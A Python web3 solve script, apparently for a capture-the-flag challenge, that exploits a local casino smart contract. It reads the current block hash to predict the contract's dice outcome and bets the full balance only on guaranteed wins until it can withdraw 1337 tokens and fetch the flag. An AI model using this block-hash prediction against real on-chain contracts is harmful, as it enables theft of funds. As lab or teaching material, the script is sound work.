import json
from requests import get
from web3 import Web3
from web3.middleware import geth_poa_middleware

URL = 'http://0.0.0.0:3000/challenge'
RPC_URL = 'http://0.0.0.0:8545/'

def deploy_chall():
    r = get(URL)
    dat = r.json()
    player_addr = dat['player_wallet']['address']
    player_privkey = dat['player_wallet']['private_key']
    ducoin_addr = dat['contract_address'][0]['address']
    casino_addr = dat['contract_address'][1]['address']
    return player_addr, player_privkey, ducoin_addr, casino_addr

def get_flag():
    r = get(URL + '/solve')
    dat = r.json()
    if dat['flag']:
        return dat['flag']
    elif dat['error']:
        return dat['error']
    elif dat['message']:
        return dat['message']

def get_block_hash(block_num):
    return web3.eth.getBlock(block_num)['hash']

def call_contract_method(method_with_args):
    nonce = web3.eth.get_transaction_count(PLAYER_ADDRESS)
    tx = method_with_args.buildTransaction({
        'chainId': 31337,
        'nonce': nonce,
        'from': PLAYER_ADDRESS,
        'gasPrice': web3.eth.gas_price
    })
    gas = web3.eth.estimate_gas(tx)
    tx['gas'] = gas
    signed_tx = web3.eth.account.sign_transaction(tx, private_key=PLAYER_PRIVKEY)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_receipt

def player_ducoin_balance():
    return ducoin_contract.functions.balanceOf(PLAYER_ADDRESS).call()

def player_casino_balance():
    return casino_contract.functions.balances(PLAYER_ADDRESS).call()

ROUNDS = 0
def play_round():
    global ROUNDS
    ROUNDS += 1
    ab = int.from_bytes(get_block_hash(web3.eth.block_number), 'big')
    a = ab & 0xffffffff
    b = (ab >> 32) & 0xffffffff
    bet = 0
    if a % 6 == 0 and b % 6 == 0:
        bet = player_casino_balance()
    play_call = casino_contract.functions.play(bet)
    call_contract_method(play_call)
    return bet

web3 = Web3(Web3.HTTPProvider(RPC_URL))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

PLAYER_ADDRESS, PLAYER_PRIVKEY, ducoin_addr, casino_addr = deploy_chall()

ducoin_abi = json.load(open('./DUCoin.json'))
casino_abi = json.load(open('./Casino.json'))

ducoin_contract = web3.eth.contract(ducoin_addr, abi=ducoin_abi)
casino_contract = web3.eth.contract(casino_addr, abi=casino_abi)

get_trial_coins_call = casino_contract.functions.getTrialCoins()
call_contract_method(get_trial_coins_call)
print(f'Got trial coins, DUC balance is {player_ducoin_balance()} DUC')

approve_call = ducoin_contract.functions.approve(casino_addr, 1000)
call_contract_method(approve_call)
deposit_call = casino_contract.functions.deposit(7)
call_contract_method(deposit_call)
print(f'Deposited coins into casino contract, casino balance is {player_casino_balance()} DUC')

while True:
    r = play_round()
    if r:
        bal = player_casino_balance()
        print(f'Won! New casino balance is {bal}')
        if bal >= 1337:
            break

print(f'Finish after {ROUNDS} rounds')
withdraw_call = casino_contract.functions.withdraw(1337)
call_contract_method(withdraw_call)
print(f'Withdrew coins, DUC balance is {player_ducoin_balance()} DUC')

print(get_flag())
